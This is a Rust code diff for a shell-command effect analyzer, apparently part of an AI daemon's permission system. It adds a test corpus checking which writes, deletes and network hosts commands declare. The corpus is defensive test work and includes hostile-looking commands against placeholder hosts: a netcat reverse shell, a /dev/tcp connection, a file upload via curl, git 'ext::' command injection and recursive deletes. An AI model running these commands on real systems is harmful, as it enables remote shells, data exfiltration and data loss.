+        "push" => &GIT_PUSH,
+        _ => {
             out.opaque();
             return;
         }
+    };
+    out.opaque();
+    let Some(parsed) = parse_options(spec, rest) else {
+        return;
+    };
+    let Some(remote) = parsed.positionals.first() else {
+        return;
+    };
+    if let Ok(Some(key)) = git_remote(remote) {
+        out.add(key);
     }
-    match subcommand.as_str() {
-        "clone" => {
-            let directory = match parsed.positionals.get(1) {
-                Some(directory) => directory.clone(),
-                None => {
-                    let name = remote
-                        .trim_end_matches('/')
-                        .rsplit(['/', ':'])
-                        .next()
-                        .unwrap_or_default();
-                    name.strip_suffix(".git").unwrap_or(name).to_string()
-                }
-            };
-            if directory.is_empty() {
-                out.unresolved();
-            } else {
-                out.path(EffectClass::Write, &directory, cwd);
-            }
+    if subcommand == "clone" {
+        if let Some(directory) = parsed.positionals.get(1) {
+            out.path(EffectClass::Write, directory, cwd);
         }
-        // They update the repository they run in.
-        "fetch" | "pull" => match cwd {
-            Some(cwd) => out.path(EffectClass::Write, cwd, None),
-            None => out.unresolved(),
-        },
-        _ => {}
     }
 }
 
@@ -2816,7 +3105,7 @@ mod tests {
         );
         // A URL host and a bare shell operand name the same target.
         assert_eq!(
-            url_effect("http://[::1]:8765/announce", "https"),
+            url_effect("http://[::1]:8765/announce"),
             Some(egress("::1:8765"))
         );
         assert_eq!(
@@ -2915,22 +3204,14 @@ mod tests {
                 "http POST https://api.example.invalid/v1 name=x",
                 &["api.example.invalid:443"],
             ),
-            ("http :8080/health", &["localhost:8080"]),
             (
-                "git clone https://git.example.invalid/acme/repo.git /tmp/aidaemon-test/clone",
+                "git ls-remote https://git.example.invalid/acme/repo.git",
                 &["git.example.invalid:443"],
-            ),
-            (
-                "git push git@git.example.invalid:acme/repo.git main",
-                &["git.example.invalid:22"],
-            ),
-            (
-                "curl -x http://proxy.example.invalid:3128 https://a.example.invalid/",
-                &["proxy.example.invalid:3128", "a.example.invalid:443"],
             ),
         ];
         for (command, hosts) in cases {
             let effects = shell_call_effects(command, None);
+            assert!(effects.complete, "{command}");
             let egress: Vec<_> = effects
                 .keys
                 .iter()
@@ -3029,5 +3310,326 @@ mod tests {
                 "{observation}"
             );
         }
+    }
+
+    /// What one corpus command must declare.
+    enum Expect {
+        /// `complete: false` (keys are a lower bound).
+        Incomplete,
+        /// `complete: true` with exactly these keys.
+        Exact(Vec<EffectKey>),
+    }
+
+    fn write(path: &str) -> EffectKey {
+        EffectKey {
+            class: EffectClass::Write,
+            target: canonical(path),
+        }
+    }
+
+    fn delete(path: &str) -> EffectKey {
+        EffectKey {
+            class: EffectClass::Delete,
+            target: canonical(path),
+        }
+    }
+
+    /// Every command from the Task 3 review (C1–C6, I1–I5, M1–M3) and its
+    /// probe list. The contract for later tasks: a command is complete only
+    /// with exactly the keys it can reach.
+    #[test]
+    fn under_declaration_corpus() {
+        use Expect::{Exact, Incomplete};
+        let w = "/tmp/aidaemon-test/w";
+        let cases: Vec<(&str, Expect)> =
+            vec![
+            // C1: `cd` moves where relative targets land.
+            ("cd /etc && echo x > f", Incomplete),
+            ("pushd /etc && rm -f f", Incomplete),
+            ("popd; echo x > f", Incomplete),
+            ("cd /tmp && curl https://a.example.invalid/", Incomplete),
+            // C3: subcommand-specific option arity.
+            ("git clone -u ./x https://a.example.invalid/r", Incomplete),
+            ("git pull -s ours https://a.example.invalid/r", Incomplete),
+            // C4: brace and glob expansion in hosts.
+            ("curl 'https://{a,b}.example.invalid/'", Incomplete),
+            ("curl https://{a,b}.example.invalid/", Incomplete),
+            ("ssh {a,b}.example.invalid", Incomplete),
+            ("scp f {a,b}.example.invalid:", Incomplete),
+            ("nc {a,b}.example.invalid 80", Incomplete),
+            ("curl 'https://a*.example.invalid/'", Incomplete),
+            ("curl 'https://a,b.example.invalid/'", Incomplete),
+            ("curl 'https://[a-b].example.invalid/'", Incomplete),
+            ("ssh 'a?.example.invalid'", Incomplete),
+            // C5: only a strict URL is read.
+            ("curl 'https://a.example.invalid\\@b.example.invalid/'", Incomplete),
+            ("curl 'https://u@a.example.invalid@b.example.invalid/'", Incomplete),
+            ("wget -O- 'http://a.example.invalid\\@b.example.invalid/'", Incomplete),
+            ("curl 'https://a.example.invalid /'", Incomplete),
+            ("curl 'https://ä.example.invalid/'", Incomplete),
+            ("git ls-remote 'https://a.example.invalid\\@b.example.invalid/r'", Incomplete),
+            // I1: rsync --port.
+            ("rsync --port=8730 f h.example.invalid:d", Incomplete),
+            ("rsync --port=8730 f rsync://h.example.invalid/m/", Incomplete),
+            // I2: proxies.
+            ("curl -x http://p.example.invalid https://a.example.invalid/", Incomplete),
+            ("curl -x socks5://p.example.invalid https://a.example.invalid/", Incomplete),
+            (
+                "curl --proxy http://p.example.invalid:3128 https://a.example.invalid/",
+                Incomplete,
+            ),
+            ("curl --socks5 p.example.invalid:1080 https://a.example.invalid/", Incomplete),
+            ("ALL_PROXY=socks5://p.example.invalid curl https://a.example.invalid/", Incomplete),
+            // I3: scheme-less URLs.
+            ("curl ftp.example.invalid/f", Incomplete),
+            ("curl a.example.invalid/x", Incomplete),
+            ("curl @file", Incomplete),
+            ("http :8080/health", Incomplete),
+            ("wget -O- a.example.invalid", Incomplete),
+            // I4: git network commands run hooks and fetch submodules.
+            ("git pull https://a.example.invalid/r", Incomplete),
+            ("git fetch https://a.example.invalid/r", Incomplete),
+            ("git push https://a.example.invalid/r main", Incomplete),
+            ("git clone https://a.example.invalid/r /tmp/aidaemon-test/c", Incomplete),
+            ("git clone https://h.example.invalid/a.bundle", Incomplete),
+            (
+                "git ls-remote https://a.example.invalid/r",
+                Exact(vec![egress("a.example.invalid:443")]),
+            ),
+            ("git ls-remote --heads https://a.example.invalid/r", Incomplete),
+            // I5: rsync writes outside the destination.
+            (
+                "rsync -b --backup-dir=/tmp/aidaemon-test/other src/ /tmp/aidaemon-test/dst/",
+                Incomplete,
+            ),
+            ("rsync -T /tmp/aidaemon-test/t src/ /tmp/aidaemon-test/dst/", Incomplete),
+            ("rsync --temp-dir=/tmp/aidaemon-test/t src/ /tmp/aidaemon-test/dst/", Incomplete),
+            ("rsync --partial-dir=.p src/ /tmp/aidaemon-test/dst/", Incomplete),
+            ("rsync --log-file=/tmp/aidaemon-test/l src/ /tmp/aidaemon-test/dst/", Incomplete),
+            ("rsync -e ssh a h.example.invalid:d", Incomplete),
+            (
+                "rsync -av /tmp/aidaemon-test/src/ /tmp/aidaemon-test/dst/",
+                Exact(vec![write("/tmp/aidaemon-test/dst")]),
+            ),
+            // M1: options after the ssh destination belong to the remote command.
+            (
+                "ssh h.example.invalid somecmd -p 2222",
+                Exact(vec![egress("h.example.invalid:22")]),
+            ),
+            // M2: backups land beside the destination.
+            ("cp -b a /tmp/aidaemon-test/f", Incomplete),
+            ("cp --backup a /tmp/aidaemon-test/f", Incomplete),
+            ("mv -b /tmp/aidaemon-test/a /tmp/aidaemon-test/f", Incomplete),
+            // Probe list: curl.
+            (
+                "curl -o /tmp/aidaemon-test/x https://a.example.invalid/",
+                Exact(vec![
+                    write("/tmp/aidaemon-test/x"),
+                    egress("a.example.invalid:443"),
+                ]),
+            ),
+            ("curl -K cfg https://a.example.invalid/", Incomplete),
+            ("curl --config cfg https://a.example.invalid/", Incomplete),
+            ("curl -O https://a.example.invalid/f", Incomplete),
+            (
+                "curl --resolve a.example.invalid:443:127.0.0.1 https://a.example.invalid/",
+                Incomplete,
+            ),
+            ("curl --connect-to ::127.0.0.1: https://a.example.invalid/", Incomplete),
+            (
+                "curl -d @file https://a.example.invalid/",
+                Exact(vec![egress("a.example.invalid:443")]),
+            ),
+            (
+                "curl -X POST https://a.example.invalid/x -d '{}'",
+                Exact(vec![egress("a.example.invalid:443")]),
+            ),
+            ("curl $URL", Incomplete),
+            ("curl \"$(cat u)\"", Incomplete),
+            (
+                "curl https://a.example.invalid/ https://b.example.invalid/",
+                Exact(vec![
+                    egress("a.example.invalid:443"),
+                    egress("b.example.invalid:443"),
+                ]),
+            ),
+            ("curl -w '%output{/tmp/x}' https://a.example.invalid/", Incomplete),
+            ("curl http://[::1]:8765/", Incomplete),
+            // Probe list: wget.
+            ("wget -i list", Incomplete),
+            ("wget -e robots=off https://a.example.invalid/", Incomplete),
+            ("wget -r https://a.example.invalid/", Incomplete),
+            ("wget -P /tmp https://a.example.invalid/", Incomplete),
+            ("wget https://a.example.invalid/f", Incomplete),
+            (
+                "wget -qO- http://b.example.invalid:8080/y",
+                Exact(vec![egress("b.example.invalid:8080")]),
+            ),
+            // Probe list: git.
+            ("git push origin main", Incomplete),
+            ("git -C /tmp/aidaemon-test/r push https://a.example.invalid/r", Incomplete),
+            ("git clone 'ext::sh -c x'", Incomplete),
+            ("git clone --upload-pack=x https://a.example.invalid/r", Incomplete),
+            ("git push --receive-pack=x https://a.example.invalid/r", Incomplete),
+            ("git commit -m x", Incomplete),
+            ("git status", Exact(vec![])),
+            // Probe list: ssh, scp, nc, rsync.
+            ("ssh -o ProxyCommand=x h.example.invalid", Incomplete),
+            ("ssh -F cfg h.example.invalid", Incomplete),
+            ("ssh -J j.example.invalid h.example.invalid", Incomplete),
+            ("ssh -W x:1 h.example.invalid", Incomplete),
+            (
+                "scp /tmp/aidaemon-test/a b.example.invalid:",
+                Exact(vec![egress("b.example.invalid:22")]),
+            ),
+            ("nc -l 8080", Incomplete),
+            ("nc -e /bin/sh h.example.invalid 80", Incomplete),
+            ("nc -x p.example.invalid:1080 h.example.invalid 80", Incomplete),
+            ("python3 -m http.server", Incomplete),
+            // Probe list: cp, mv, tee.
+            (
+                "cp -r /tmp/aidaemon-test/src /tmp/aidaemon-test/dst",
+                Exact(vec![write("/tmp/aidaemon-test/dst")]),
+            ),
+            (
+                "mv /tmp/aidaemon-test/a /tmp/aidaemon-test/b /tmp/aidaemon-test/c/",
+                Exact(vec![
+                    write("/tmp/aidaemon-test/c"),
+                    delete("/tmp/aidaemon-test/a"),
+                    delete("/tmp/aidaemon-test/b"),
+                ]),
+            ),
+            (
+                "tee -a /tmp/aidaemon-test/f",
+                Exact(vec![write("/tmp/aidaemon-test/f")]),
+            ),
+            // Probe list: redirects.
+            ("echo x >&2", Exact(vec![])),
+            ("echo x >| /tmp/aidaemon-test/f", Exact(vec![write("/tmp/aidaemon-test/f")])),
+            ("echo x &> /tmp/aidaemon-test/f", Exact(vec![write("/tmp/aidaemon-test/f")])),
+            ("echo x 2> /tmp/aidaemon-test/f", Exact(vec![write("/tmp/aidaemon-test/f")])),
+            ("echo x >& /tmp/aidaemon-test/f", Exact(vec![write("/tmp/aidaemon-test/f")])),
+            ("echo x > 'out file'", Incomplete),
+            ("exec 3> /tmp/aidaemon-test/f", Incomplete),
+            ("cat <> /tmp/aidaemon-test/f", Incomplete),
+            ("cat <<EOF\nx\nEOF", Incomplete),
+            ("echo $'x'", Incomplete),
+            ("cat < /dev/tcp/h.example.invalid/80", Incomplete),
+            // Probe list: wrappers and groupings.
+            ("xargs rm", Incomplete),
+            ("find . -exec rm {} \\;", Incomplete),
+            ("sh -c 'rm /tmp/aidaemon-test/x'", Incomplete),
+            ("env X=1 rm /tmp/aidaemon-test/x", Incomplete),
+            ("command rm /tmp/aidaemon-test/x", Incomplete),
+            ("nohup rm /tmp/aidaemon-test/x", Incomplete),
+            ("timeout 5 rm /tmp/aidaemon-test/x", Incomplete),
+            ("sudo rm /tmp/aidaemon-test/x", Incomplete),
+            ("time rm /tmp/aidaemon-test/x", Incomplete),
+            ("{ rm /tmp/aidaemon-test/x; }", Incomplete),
+            ("( rm /tmp/aidaemon-test/x )", Incomplete),
+            ("X=1 rm /tmp/aidaemon-test/x", Incomplete),
+            // Probe list: deletes.
+            (
+                "rm -- -rf",
+                Exact(vec![delete("/tmp/aidaemon-test/w/-rf")]),
+            ),
+            ("git ls-remote git@git.example.invalid:acme/repo.git", Incomplete),
+            (
+                "unlink /tmp/aidaemon-test/x",
+                Exact(vec![delete("/tmp/aidaemon-test/x")]),
+            ),
+            ("rm /tmp/aidaemon-test/*.o", Incomplete),
+            ("rm ~other/x", Incomplete),
+            ("rm /tmp/aidaemon-test/a\\ b", Incomplete),
+            ("shred /tmp/aidaemon-test/x", Incomplete),
+            ("truncate -s0 /tmp/aidaemon-test/x", Incomplete),
+            ("dd of=/tmp/aidaemon-test/x", Incomplete),
+            ("install a /tmp/aidaemon-test/b", Incomplete),
+            ("ln -s a /tmp/aidaemon-test/b", Incomplete),
+            ("chmod 600 /tmp/aidaemon-test/x", Incomplete),
+            // Probe list: chains collect every segment.
+            (
+                "curl https://a.example.invalid/ | grep x; echo y > /tmp/aidaemon-test/f || true",
+                Exact(vec![
+                    egress("a.example.invalid:443"),
+                    write("/tmp/aidaemon-test/f"),
+                ]),
+            ),
+            ("bash x && curl https://a.example.invalid/", Incomplete),
+            // Unquoted expansion anywhere in a segment.
+            ("echo {a,b} > /tmp/aidaemon-test/f", Incomplete),
+            ("echo * > /tmp/aidaemon-test/f", Incomplete),
+            ("curl -H \"X: $TOKEN\" https://a.example.invalid/", Incomplete),
+        ];
+        let mut wrong = Vec::new();
+        for (command, expect) in cases {
+            let effects = shell_call_effects(command, Some(w));
+            let ok = match expect {
+                Incomplete => !effects.complete,
+                Exact(mut expected) => {
+                    let mut keys = effects.keys.clone();
+                    let order = |key: &EffectKey| format!("{} {}", key.class, key.target);
+                    keys.sort_by_key(order);
+                    expected.sort_by_key(order);
+                    effects.complete && keys == expected
+                }
+            };
+            // An expanded word never becomes a key.
+            let clean = effects
+                .keys
+                .iter()
+                .all(|key| !key.target.contains(['{', '}', '*', '?', ',', '\\']));
+            if !ok || !clean {
+                wrong.push(format!("{command:?} => {effects:?}"));
+            }
+        }
+        assert!(
+            wrong.is_empty(),
+            "{} wrong:\n{}",
+            wrong.len(),
+            wrong.join("\n")
+        );
+        // The partial keys of an incomplete call are still declared.
+        let partial = shell_call_effects("git pull https://a.example.invalid/r", None);
+        assert!(partial.keys.contains(&egress("a.example.invalid:443")));
+    }
+
+    /// C6: shell operands resolve physically, the way the OS does.
+    #[cfg(unix)]
+    #[test]
+    fn shell_paths_resolve_through_symlinks_physically() {
+        let dir = tempfile::tempdir().unwrap();
+        let w = std::fs::canonicalize(dir.path()).unwrap();
+        let w = w.to_str().unwrap();
+        std::fs::create_dir_all(format!("{w}/a/real")).unwrap();
+        std::os::unix::fs::symlink(format!("{w}/a/real"), format!("{w}/link")).unwrap();
+        std::os::unix::fs::symlink(format!("{w}/missing"), format!("{w}/dangling")).unwrap();
+        let key = |class, path: String| EffectKey {
+            class,
+            target: path,
+        };
+        // `rm -rf link/` deletes the target directory's contents.
+        let trailing = shell_call_effects(&format!("rm -rf {w}/link/"), None);
+        assert!(trailing.complete);
+        assert!(trailing
+            .keys
+            .contains(&key(EffectClass::Delete, format!("{w}/a/real"))));
+        assert!(trailing
+            .keys
+            .contains(&key(EffectClass::Delete, format!("{w}/link"))));
+        // `link/..` is the link target's parent, not `w`.
+        let climbed = shell_call_effects(&format!("rm -rf {w}/link/../victim"), None);
+        assert!(climbed.complete);
+        assert!(climbed
+            .keys
+            .contains(&key(EffectClass::Delete, format!("{w}/a/victim"))));
+        let redirected = shell_call_effects(&format!("echo x > {w}/link/../f"), None);
+        assert!(redirected.complete);
+        assert_eq!(
+            redirected.keys,
+            vec![key(EffectClass::Write, format!("{w}/a/f"))]
+        );
+        // A prefix that exists but cannot be canonicalized is undeterminable.
+        assert!(!shell_call_effects(&format!("echo x > {w}/dangling/f"), None).complete);
     }
 }
